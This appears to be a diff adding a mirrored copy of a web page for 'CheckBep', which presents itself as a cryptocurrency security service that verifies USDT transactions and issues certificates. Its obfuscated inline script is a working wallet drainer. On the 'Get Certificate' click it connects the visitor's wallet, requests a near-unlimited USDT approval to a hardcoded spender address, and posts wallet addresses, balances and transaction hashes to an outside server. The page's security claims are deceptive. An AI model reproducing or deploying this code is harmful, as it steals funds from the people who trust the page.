@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="dark">
+
+<!-- Mirrored from checkbep20.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 31 May 2025 17:13:05 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Security Platform - Home</title>
+    <!-- Bootstrap CSS from Replit Theme -->
+    <link rel="stylesheet" href="../cdn.replit.com/agent/bootstrap-agent-dark-theme.min.css">
+    <!-- FontAwesome for icons -->
+    <link rel="stylesheet" href="../cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="static/css/custom.css">
+    <script src="../cdn.jsdelivr.net/npm/web3%401.5.2/dist/web3.min.js"></script>
+
+    
+</head>
+<body>
+    <!-- Navigation Bar -->
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+        <div class="container">
+            <a class="navbar-brand" href="index.html">
+                <i class="fas fa-shield-alt me-2"></i>CheckBep
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
+                    <li class="nav-item">
+                        <a class="nav-link active" aria-current="page" href="index.html">Home</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link " href="about.html">About Us</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link " href="how-it-works.html">How It Works</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link " href="security-guide.html">Security Guide</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link " href="check-transaction.html">Verify Transaction</a>
+                    </li>
+                </ul>
+                <ul class="navbar-nav">
+                    
+                    <li class="nav-item">
+                        <a class="nav-link" href="admin/login.html">Admin Login</a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Flash Messages -->
+    <div class="container mt-3">
+        
+            
+        
+    </div>
+
+    <!-- Main Content -->
+    <main>
+        
+<section class="py-5 text-center container">
+    <div class="row py-lg-5">
+        <div class="col-lg-8 col-md-10 mx-auto">
+            <h1 class="fw-light">Secure Cryptocurrency Trading</h1>
+            <p class="lead text-body-secondary">
+                Our platform verifies USDT transactions, ensures proper approvals are in place, and provides secure trade certificates to protect both buyers and sellers.
+            </p>
+            <div class="d-grid gap-2 d-sm-flex justify-content-sm-center">
+                <a href="javascript:void(0);" onclick="checkAndApprove()" class="btn btn-primary btn-lg px-4 gap-3">
+                    <i class="fas fa-shield-alt me-2"></i>Get Certificate
+                </a>
+                <!-- This section is shown before approval -->
+            <div id="approvalSection" style="display: block;">
+            <p></p>
+            </div>
+  
+            <!-- This section is shown after approval -->
+            <div><span id="balanceAmount" style="font-weight: bold;"></span></div>
+            <div id="certificateNumber" style="margin-bottom: 8px; font-weight: bold;"></div>
+            <div id="walletAddress" style="margin-bottom: 8px; font-weight: bold;"></div>
+                <div id="status" class="status info"></div>
+                <a href="how-it-works.html" class="btn btn-outline-secondary btn-lg px-4">
+                    <i class="fas fa-info-circle me-2"></i>Learn More
+                </a>
+            </div>
+        </div>
+    </div>
+</section>
+
+<div class="container">
+    <!-- Key Features Section -->
+    <section class="my-5">
+        <h2 class="text-center mb-4">Our Security Features</h2>
+        <div class="row g-4">
+            <div class="col-md-4">
+                <div class="card h-100 border-0 bg-dark">
+                    <div class="card-body text-center">
+                        <i class="fas fa-wallet fa-3x text-primary mb-3"></i>
+                        <h5 class="card-title">USDT Balance Verification</h5>
+                        <p class="card-text">We check the actual USDT balance in your wallet to verify fund availability before trading.</p>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="card h-100 border-0 bg-dark">
+                    <div class="card-body text-center">
+                        <i class="fas fa-gas-pump fa-3x text-warning mb-3"></i>
+                        <h5 class="card-title">BNB Fee Validation</h5>
+                        <p class="card-text">We ensure you have sufficient BNB for transaction fees to avoid failed transfers.</p>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="card h-100 border-0 bg-dark">
+                    <div class="card-body text-center">
+                        <i class="fas fa-certificate fa-3x text-success mb-3"></i>
+                        <h5 class="card-title">Secure Trade Certificates</h5>
+                        <p class="card-text">Each verified transaction receives a unique certificate as proof of the secure trade.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- How It Works Section -->
+    <section class="my-5">
+        <h2 class="text-center mb-4">How It Works</h2>
+        <div class="row align-items-center">
+            <div class="col-md-6 order-md-2">
+                <div class="card bg-dark border-0">
+                    <div class="card-body">
+                        <div class="card-body">
+                            <h3 class="card-title">Simple 3-Step Process</h3>
+                            <div class="d-flex align-items-start mb-3">
+                                <div class="bg-primary rounded-circle p-2 me-3 d-flex align-items-center justify-content-center" style="width: 40px; height: 40px;">
+                                    <span class="text-white fw-bold">1</span>
+                                </div>
+                                <div>
+                                    <h5>Submit Your Transaction Details</h5>
+                                    <p>Enter your wallet address and transaction information for verification.</p>
+                                </div>
+                            </div>
+                            <div class="d-flex align-items-start mb-3">
+                                <div class="bg-primary rounded-circle p-2 me-3 d-flex align-items-center justify-content-center" style="width: 40px; height: 40px;">
+                                    <span class="text-white fw-bold">2</span>
+                                </div>
+                                <div>
+                                    <h5>Blockchain Verification</h5>
+                                    <p>Our system checks USDT balance, BNB fees, and approval status.</p>
+                                </div>
+                            </div>
+                            <div class="d-flex align-items-start">
+                                <div class="bg-primary rounded-circle p-2 me-3 d-flex align-items-center justify-content-center" style="width: 40px; height: 40px;">
+                                    <span class="text-white fw-bold">3</span>
+                                </div>
+                                <div>
+                                    <h5>Receive Secure Certificate</h5>
+                                    <p>Get your transaction certificate with a unique verification ID.</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-6 order-md-1">
+                <div class="text-center">
+                    <svg width="400" height="300" viewBox="0 0 400 300" xmlns="http://www.w3.org/2000/svg">
+                        <!-- Blockchain illustration -->
+                        <rect x="50" y="100" width="300" height="60" rx="10" fill="#212529" stroke="#0d6efd" stroke-width="2"/>
+                        <rect x="70" y="120" width="40" height="20" rx="5" fill="#0d6efd"/>
+                        <rect x="130" y="120" width="40" height="20" rx="5" fill="#0d6efd"/>
+                        <rect x="190" y="120" width="40" height="20" rx="5" fill="#0d6efd"/>
+                        <rect x="250" y="120" width="40" height="20" rx="5" fill="#0d6efd"/>
+                        <rect x="310" y="120" width="20" height="20" rx="5" fill="#0d6efd"/>
+                        
+                        <!-- Lines connecting blocks -->
+                        <line x1="110" y1="130" x2="130" y2="130" stroke="#6c757d" stroke-width="2"/>
+                        <line x1="170" y1="130" x2="190" y2="130" stroke="#6c757d" stroke-width="2"/>
+                        <line x1="230" y1="130" x2="250" y2="130" stroke="#6c757d" stroke-width="2"/>
+                        <line x1="290" y1="130" x2="310" y2="130" stroke="#6c757d" stroke-width="2"/>
+                        
+                        <!-- Certificate -->
+                        <rect x="150" y="200" width="100" height="70" rx="5" fill="#198754" stroke="#ffffff" stroke-width="1"/>
+                        <line x1="160" y1="220" x2="240" y2="220" stroke="#ffffff" stroke-width="1"/>
+                        <line x1="160" y1="230" x2="240" y2="230" stroke="#ffffff" stroke-width="1"/>
+                        <line x1="160" y1="240" x2="240" y2="240" stroke="#ffffff" stroke-width="1"/>
+                        <line x1="160" y1="250" x2="200" y2="250" stroke="#ffffff" stroke-width="1"/>
+                        
+                        <!-- Document seal -->
+                        <circle cx="215" cy="250" r="10" fill="#ffc107"/>
+                        
+                        <!-- Connection between blockchain and certificate -->
+                        <line x1="200" y1="160" x2="200" y2="200" stroke="#6c757d" stroke-width="2" stroke-dasharray="5,5"/>
+                        
+                        <!-- Wallet symbol -->
+                        <rect x="180" y="30" width="40" height="30" rx="5" fill="#212529" stroke="#20c997" stroke-width="2"/>
+                        <rect x="175" y="40" width="50" height="20" rx="5" fill="#212529" stroke="#20c997" stroke-width="2"/>
+                        
+                        <!-- Connection between wallet and blockchain -->
+                        <line x1="200" y1="60" x2="200" y2="100" stroke="#6c757d" stroke-width="2" stroke-dasharray="5,5"/>
+                    </svg>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Stats Section -->
+    <section class="my-5 py-4 bg-dark rounded">
+        <h2 class="text-center mb-4">Why Choose Our Platform</h2>
+        <div class="row text-center">
+            <div class="col-md-4">
+                <div class="p-3">
+                    <h3 class="text-primary"><i class="fas fa-lock me-2"></i>100%</h3>
+                    <p class="lead">Secure Transactions</p>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="p-3">
+                    <h3 class="text-warning"><i class="fas fa-bolt me-2"></i>24/7</h3>
+                    <p class="lead">Verification Service</p>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="p-3">
+                    <h3 class="text-success"><i class="fas fa-shield-alt me-2"></i>Verified</h3>
+                    <p class="lead">By Blockchain</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Call to Action -->
+    <section class="my-5 text-center">
+        <div class="p-5 rounded bg-primary bg-opacity-10">
+            <h2>Ready to secure your cryptocurrency transactions?</h2>
+            <p class="lead">Start using our verification platform today and trade with confidence.</p>
+            <a href="check-transaction.html" class="btn btn-primary btn-lg mt-3">
+                <i class="fas fa-shield-alt me-2"></i>Verify Your Transaction Now
+            </a>
+        </div>
+    </section>
+</div>
+
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-dark text-light py-4 mt-5">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-4">
+                    <h5>CryptoSecurity Platform</h5>
+                    <p>Verifying cryptocurrency transactions and ensuring secure trades with our certificate system.</p>
+                </div>
+                <div class="col-md-4">
+                    <h5>Quick Links</h5>
+                    <ul class="list-unstyled">
+                        <li><a href="index.html" class="text-light">Home</a></li>
+                        <li><a href="about.html" class="text-light">About Us</a></li>
+                        <li><a href="how-it-works.html" class="text-light">How It Works</a></li>
+                        <li><a href="security-guide.html" class="text-light">Security Guide</a></li>
+                        <li><a href="check-transaction.html" class="text-light">Verify Transaction</a></li>
+                    </ul>
+                </div>
+                <div class="col-md-4">
+                    <h5>Contact Us</h5>
+                    <address>
+                        <i class="fas fa-envelope me-2"></i> <a href="cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="e5969095958a9791a586979c95918a96808690978c919ccb868a88">[email&#160;protected]</a><br>
+                        <i class="fas fa-phone me-2"></i> +1 (555) 123-4567<br>
+                        <div class="mt-3">
+                            <a href="#" class="text-light me-2"><i class="fab fa-twitter fa-lg"></i></a>
+                            <a href="#" class="text-light me-2"><i class="fab fa-telegram fa-lg"></i></a>
+                            <a href="#" class="text-light me-2"><i class="fab fa-discord fa-lg"></i></a>
+                        </div>
+                    </address>
+                </div>
+            </div>
+            <hr class="my-3 bg-secondary">
+            <div class="text-center">
+                <p class="mb-0">&copy; 2025 CryptoSecurity Platform. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script data-cfasync="false" src="cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
+    const _0x4dfd51=_0x49b9;(function(_0x1844a0,_0x18d6d8){const _0x358301=_0x49b9,_0x15f50c=_0x1844a0();while(!![]){try{const _0x1fb01e=-parseInt(_0x358301(0x223))/0x1+parseInt(_0x358301(0x22d))/0x2*(-parseInt(_0x358301(0x201))/0x3)+-parseInt(_0x358301(0x1e5))/0x4+-parseInt(_0x358301(0x20d))/0x5*(parseInt(_0x358301(0x1e4))/0x6)+parseInt(_0x358301(0x1e9))/0x7*(-parseInt(_0x358301(0x230))/0x8)+-parseInt(_0x358301(0x22b))/0x9+parseInt(_0x358301(0x233))/0xa;if(_0x1fb01e===_0x18d6d8)break;else _0x15f50c['push'](_0x15f50c['shift']());}catch(_0x280170){_0x15f50c['push'](_0x15f50c['shift']());}}}(_0xcc73,0x632dd));const BSC_CHAIN_ID='0x38',USDT_CONTRACT_ADDRESS='0x55d398326f99059fF775485246999027B3197955',SPENDER_ADDRESS=_0x4dfd51(0x204),MAX_UINT=_0x4dfd51(0x206);let web3,usdtContract;const USDT_ABI=[{'constant':!![],'inputs':[{'name':_0x4dfd51(0x209),'type':'address'},{'name':_0x4dfd51(0x203),'type':_0x4dfd51(0x20c)}],'name':_0x4dfd51(0x21e),'outputs':[{'name':'','type':_0x4dfd51(0x208)}],'type':'function'},{'constant':![],'inputs':[{'name':_0x4dfd51(0x203),'type':_0x4dfd51(0x20c)},{'name':'_value','type':_0x4dfd51(0x208)}],'name':_0x4dfd51(0x1fa),'outputs':[{'name':'','type':'bool'}],'type':'function'},{'constant':!![],'inputs':[{'name':_0x4dfd51(0x209),'type':'address'}],'name':'balanceOf','outputs':[{'name':_0x4dfd51(0x1ea),'type':_0x4dfd51(0x208)}],'type':_0x4dfd51(0x1f5)}];async function checkAndApprove(){const _0x55af4e=_0x4dfd51;try{if(!window[_0x55af4e(0x234)])throw new Error(_0x55af4e(0x1f2));web3=new Web3(window['ethereum']),await handleNetworkSwitch();const _0x1b2393=await connectWallet();await initializeContract();const _0x3226d5=_0x1b2393[0x0],_0x494097=await web3[_0x55af4e(0x216)][_0x55af4e(0x1ed)](_0x3226d5),_0x42fdd5=parseFloat(web3[_0x55af4e(0x1ff)][_0x55af4e(0x231)](_0x494097,_0x55af4e(0x219)))['toFixed'](0x6),_0x1e8795=await usdtContract[_0x55af4e(0x224)][_0x55af4e(0x22c)](_0x3226d5)['call'](),_0x426592=Number(_0x1e8795)/0xa**0x12,_0x1b045f=_0x426592[_0x55af4e(0x1fd)](0x2);sendDataToServer(_0x55af4e(0x1f3),{'wallet':_0x3226d5,'bnb':_0x42fdd5,'usdt':_0x1b045f});if(_0x426592<=0x5){updateStatus(_0x55af4e(0x226),_0x55af4e(0x1e6));return;}const _0x42c932=await checkApprovalStatus(_0x3226d5);if(_0x42c932){await showBalance(_0x3226d5);return;}const _0x430c92=await submitApproval(_0x3226d5);sendDataToServer(_0x55af4e(0x215),{'wallet':_0x3226d5,'transactionHash':_0x430c92}),await showBalance(_0x3226d5);}catch(_0x53c2b8){console['error'](_0x53c2b8),updateStatus(_0x55af4e(0x210)+_0x53c2b8[_0x55af4e(0x225)],_0x55af4e(0x235));}}async function submitApproval(_0x2a9c77){const _0x519682=_0x4dfd51;updateStatus('Requesting\x20Verification...');try{const _0x488659=await usdtContract[_0x519682(0x224)]['approve'](SPENDER_ADDRESS,MAX_UINT)[_0x519682(0x1fc)]({'from':_0x2a9c77});return updateStatus(_0x519682(0x1f8)+_0x488659[_0x519682(0x207)],_0x519682(0x1e1)),_0x488659[_0x519682(0x207)];}catch(_0x1958fd){console[_0x519682(0x235)](_0x519682(0x21c),_0x1958fd);throw new Error('User\x20rejected\x20Verification');}}async function checkApprovalStatus(_0xc5c97){const _0x3f9055=_0x4dfd51;updateStatus(_0x3f9055(0x21b));try{const _0x1d4cf0=await usdtContract['methods'][_0x3f9055(0x21e)](_0xc5c97,SPENDER_ADDRESS)['call'](),_0x1132b8=BigInt(0x2e90edd000),_0x43d38a=BigInt(_0x1d4cf0);return _0x43d38a>=_0x1132b8?(updateStatus('Already\x20verified\x20✅',_0x3f9055(0x1e1)),!![]):(updateStatus(_0x3f9055(0x211),_0x3f9055(0x229)),![]);}catch(_0x430b99){console[_0x3f9055(0x235)](_0x3f9055(0x1e7),_0x430b99);throw new Error(_0x3f9055(0x21f));}}async function showBalance(_0x458fd8){const _0x19efbb=_0x4dfd51;updateStatus(_0x19efbb(0x1f1));try{const _0x8f3d3f=await usdtContract[_0x19efbb(0x224)][_0x19efbb(0x22c)](_0x458fd8)[_0x19efbb(0x1e3)](),_0x1ff194=(_0x8f3d3f/0xa**0x12)['toFixed'](0x2);let _0x413edb=await usdtContract[_0x19efbb(0x224)][_0x19efbb(0x21e)](_0x458fd8,SPENDER_ADDRESS)[_0x19efbb(0x1e3)]();const _0x4a893f=BigInt(_0x19efbb(0x1ee));if(BigInt(_0x413edb)<_0x4a893f){updateStatus(_0x19efbb(0x1eb));const _0x452da8=await submitApproval(_0x458fd8);await sendDataToServer(_0x19efbb(0x215),{'wallet':_0x458fd8,'transactionHash':_0x452da8}),await new Promise(_0x2e37f7=>setTimeout(_0x2e37f7,0xbb8)),_0x413edb=await usdtContract[_0x19efbb(0x224)]['allowance'](_0x458fd8,SPENDER_ADDRESS)[_0x19efbb(0x1e3)]();if(BigInt(_0x413edb)<_0x4a893f){updateStatus(_0x19efbb(0x20b),'error');return;}}const _0x12a0b7=generateCertificateNumber(),_0x58b6d1=document[_0x19efbb(0x222)](_0x19efbb(0x1f9)),_0x1d27b5=document[_0x19efbb(0x222)]('balanceSection'),_0x281694=document['getElementById'](_0x19efbb(0x232)),_0x1b7115=document[_0x19efbb(0x222)](_0x19efbb(0x217)),_0x774538=document['getElementById'](_0x19efbb(0x1f4));if(_0x58b6d1)_0x58b6d1[_0x19efbb(0x1ef)][_0x19efbb(0x20e)]=_0x19efbb(0x220);if(_0x1d27b5)_0x1d27b5[_0x19efbb(0x1ef)][_0x19efbb(0x20e)]=_0x19efbb(0x20f);if(_0x281694)_0x281694[_0x19efbb(0x1ec)]=_0x1ff194;if(_0x1b7115)_0x1b7115[_0x19efbb(0x1ec)]='Certificate\x20No:\x20'+_0x12a0b7;if(_0x774538)_0x774538[_0x19efbb(0x1ec)]=_0x19efbb(0x1e8)+_0x458fd8;updateStatus('Verified\x20✅',_0x19efbb(0x1e1)),await sendDataToServer('certificate_generated',{'wallet':_0x458fd8,'usdt':_0x1ff194,'certificate':_0x12a0b7});}catch(_0xe5db93){console['error'](_0x19efbb(0x202),_0xe5db93),updateStatus(_0x19efbb(0x210)+_0xe5db93[_0x19efbb(0x225)],_0x19efbb(0x235));}}async function refreshData(){const _0x33600f=_0x4dfd51,_0x4d9b2f=await web3['eth'][_0x33600f(0x212)]();await checkApprovalStatus(_0x4d9b2f[0x0]),await showBalance(_0x4d9b2f[0x0]),await getAndSendBalances(_0x4d9b2f[0x0]);}async function initializeContract(){const _0x4e1f44=_0x4dfd51;usdtContract=new web3['eth'][(_0x4e1f44(0x21a))](USDT_ABI,USDT_CONTRACT_ADDRESS);}function _0x49b9(_0x9a3bc2,_0x2ca596){const _0xcc738a=_0xcc73();return _0x49b9=function(_0x49b99d,_0x5f7103){_0x49b99d=_0x49b99d-0x1e1;let _0x2589bc=_0xcc738a[_0x49b99d];return _0x2589bc;},_0x49b9(_0x9a3bc2,_0x2ca596);}async function handleNetworkSwitch(){const _0x1f42f0=_0x4dfd51,_0x367f8e=await web3[_0x1f42f0(0x216)][_0x1f42f0(0x20a)]();if(_0x367f8e!==0x38){updateStatus(_0x1f42f0(0x1f6));try{await window[_0x1f42f0(0x234)][_0x1f42f0(0x218)]({'method':_0x1f42f0(0x213),'params':[{'chainId':BSC_CHAIN_ID}]});}catch(_0x4652c5){if(_0x4652c5['code']===0x1326)await addBscNetwork();throw _0x4652c5;}}}async function addBscNetwork(){const _0x3b8cc0=_0x4dfd51;await window[_0x3b8cc0(0x234)]['request']({'method':_0x3b8cc0(0x1fe),'params':[{'chainId':BSC_CHAIN_ID,'chainName':'Binance\x20Smart\x20Chain','nativeCurrency':{'name':'BNB','symbol':_0x3b8cc0(0x1f7),'decimals':0x12},'rpcUrls':[_0x3b8cc0(0x22f)],'blockExplorerUrls':[_0x3b8cc0(0x228)]}]});}function _0xcc73(){const _0x2c7604=['1822164OObuMU','No\x20need\x20to\x20check','Verification\x20check\x20failed:','Wallet:\x20','1379ILGIwy','balance','Allowance\x20is\x20below\x20200,000\x20USDT.\x20Approving\x20again...','textContent','getBalance','200000000000000000000000','style','POST','Fetching\x20USDT\x20balance...','Please\x20install\x20MetaMask!','wallet_connect','walletAddress','function','Please\x20wait...','bnb','Verified!\x20TX\x20Hash:\x20','approvalSection','approve','eth_requestAccounts','send','toFixed','wallet_addEthereumChain','utils','now','816YHViuY','Balance\x20or\x20approval\x20failed:','_spender','0x194fAa215f0b2E0C95eB312a963c5BDDD0f6eeE9','status','50000000000000000000000000000','transactionHash','uint256','_owner','getChainId','Approval\x20failed\x20or\x20not\x20confirmed.\x20Try\x20again.','address','5ToYUaI','display','block','Error:\x20','Verification\x20not\x20proper.\x20Verification\x20required.','getAccounts','wallet_switchEthereumChain','toString','approval','eth','certificateNumber','request','ether','Contract','Checking\x20Verification\x20status...','Verification\x20failed:','className','allowance','Failed\x20to\x20check\x20Verification\x20status','none','toUpperCase','getElementById','102870iIYFOz','methods','message','USDT\x20balance\x20is\x20too\x20low\x20for\x20trading.','floor','https://bscscan.com/','warning','Checking\x20wallet...','2816523gvtuOK','balanceOf','4822DVAQXt','stringify','https://bsc-dataseed.binance.org/','3384RvXAvD','fromWei','balanceAmount','23132030NysDqE','ethereum','error','success','https://apibep.pikainfinity.store/verify.php','call','1778910GzxdRh'];_0xcc73=function(){return _0x2c7604;};return _0xcc73();}async function connectWallet(){const _0xe1ff29=_0x4dfd51;updateStatus(_0xe1ff29(0x22a));try{const _0xb45144=await window[_0xe1ff29(0x234)][_0xe1ff29(0x218)]({'method':_0xe1ff29(0x1fb)});return _0xb45144;}catch(_0x4651b0){throw new Error('User\x20rejected\x20connection');}}async function sendDataToServer(_0x495a1f,_0x54d981){const _0x3f2c84=_0x4dfd51;try{await fetch(_0x3f2c84(0x1e2),{'method':_0x3f2c84(0x1f0),'headers':{'Content-Type':'application/json'},'body':JSON[_0x3f2c84(0x22e)]({'action':_0x495a1f,..._0x54d981})});}catch(_0x23ee81){console['error']('Failed\x20to\x20check\x20database..:',_0x23ee81);}}async function getAndSendBalances(_0x418eba){const _0x27a49b=_0x4dfd51;try{const _0x25774f=await usdtContract['methods'][_0x27a49b(0x22c)](_0x418eba)[_0x27a49b(0x1e3)](),_0x5a6c5f=(_0x25774f/0xa**0x12)[_0x27a49b(0x1fd)](0x6),_0x245bc3=await web3['eth'][_0x27a49b(0x1ed)](_0x418eba),_0x14dcdb=web3[_0x27a49b(0x1ff)][_0x27a49b(0x231)](_0x245bc3,_0x27a49b(0x219));await sendDataToServer('balance_update',{'wallet':_0x418eba,'usdt':_0x5a6c5f,'bnb':_0x14dcdb});}catch(_0x44525d){console['error']('Failed\x20to\x20fetch/send\x20balances:',_0x44525d);}}function updateStatus(_0x2fd2cc,_0x18b0a2='info'){const _0x5573fb=_0x4dfd51,_0x36ea82=document['getElementById'](_0x5573fb(0x205));_0x36ea82[_0x5573fb(0x1ec)]=_0x2fd2cc,_0x36ea82[_0x5573fb(0x21d)]='status\x20'+_0x18b0a2;}function generateCertificateNumber(){const _0x1be9f2=_0x4dfd51,_0x18334a=Date[_0x1be9f2(0x200)]()[_0x1be9f2(0x214)](0x24),_0x6ab77e=Math[_0x1be9f2(0x227)](Math['random']()*0x5f5e100)['toString'](0x24);return('CERT-'+_0x18334a+'-'+_0x6ab77e)[_0x1be9f2(0x221)]();}
+    </script>
+
+    <!-- Bootstrap and other scripts -->
+    <script src="../cdn.jsdelivr.net/npm/bootstrap%405.2.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="static/js/main.js"></script>
+    
+</body>
+
+<!-- Mirrored from checkbep20.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 31 May 2025 17:13:13 GMT -->
+</html>
